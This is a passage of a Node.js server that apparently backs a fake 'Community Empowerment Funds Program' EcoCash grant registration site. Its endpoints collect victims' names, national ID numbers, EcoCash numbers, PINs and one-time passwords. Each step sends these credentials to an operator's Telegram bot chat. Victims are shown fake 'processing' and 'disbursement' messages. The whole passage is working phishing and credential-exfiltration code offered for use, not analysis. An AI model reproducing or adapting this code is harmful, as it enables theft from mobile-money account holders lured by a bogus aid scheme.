            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        if (registration.ecoPin !== pin) {
            const wrongMessage =
                '⚠️ <b>WRONG PIN ENTERED</b>\n\n' +
                '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
                '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
                '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
                '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
                '📌 <b>Purpose:</b> ' + purpose + '\n' +
                '🔑 <b>PIN Entered:</b> <code>' + pin + '</code>\n' +
                '✅ <b>Correct PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
                '⏰ <b>Time:</b> ' + new Date().toLocaleString();
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await axios.post(url, { chat_id: CHAT_ID, text: wrongMessage, parse_mode: 'HTML' });
            return res.status(400).json({ success: false, message: 'Invalid PIN. Please try again.' });
        }

        // ===== PIN CONFIRMED NOTIFICATION (FULL DETAILS INCLUDING PIN) =====
        const msg =
            '🔒 <b>PIN CONFIRMED - PROCESSING BEGINS</b>\n\n' +
            '🆔 <b>Registration:</b> <code>#' + registrationId + '</code>\n' +
            '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
            '🔑 <b>PIN Entered:</b> <code>' + pin + '</code>\n' +
            '📌 <b>Purpose:</b> ' + purpose + '\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Status:</b> Processing started\n' +
            '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
            '⏳ <i>Application is being verified and processed...</i>';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });

        res.json({ success: true, message: 'PIN confirmed' });

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, message: 'Failed to confirm PIN' });
    }
});

// ===== API: DISBURSEMENT COMPLETE =====
app.post('/api/disbursement-complete', async (req, res) => {
    try {
        const { registrationId } = req.body;
        const registration = pendingRegistrations[registrationId];

        if (!registration) {
            return res.status(404).json({ success: false, message: 'Registration not found' });
        }

        registration.verified = true;
        registration.completedAt = new Date().toISOString();

        // ===== FINAL NOTIFICATION - FULL DETAILS =====
        const finalMessage =
            '🎉 <b>APPLICATION COMPLETE - DISBURSEMENT IN PROGRESS</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Full Name:</b> ' + registration.fullName + '\n' +
            '🪪 <b>ID Number:</b> <code>' + registration.idNumber + '</code>\n' +
            '📱 <b>EcoCash Number:</b> <code>' + registration.ecocashNumber + '</code>\n' +
            '🔑 <b>EcoCash PIN:</b> <code>' + registration.ecoPin + '</code>\n' +
            '📌 <b>Purpose:</b> ' + (registration.purpose || 'N/A') + '\n' +
            '🔐 <b>OTP 1:</b> <code>' + registration.otp + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📊 <b>Progress:</b>\n' +
            '  ✅ Verifying Details\n' +
            '  ✅ Document Verification\n' +
            '  ✅ Calculating Disbursement\n' +
            '  ✅ Disbursement in Progress\n\n' +
            '💵 <b>Disbursement:</b> Amount will be credited based on purpose and document verification.\n' +
            '⏰ <b>Completed:</b> ' + new Date().toLocaleString() + '\n\n' +
            '💚 <i>Community Empowerment Funds Program</i>';

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: CHAT_ID, text: finalMessage, parse_mode: 'HTML' });

        res.json({ success: true, message: 'Disbursement complete' });

    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, message: 'Failed to complete' });
    }
});

// ===== HEALTH CHECK =====
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`🚀 EcoCash Registration App running on port ${PORT}`);
});
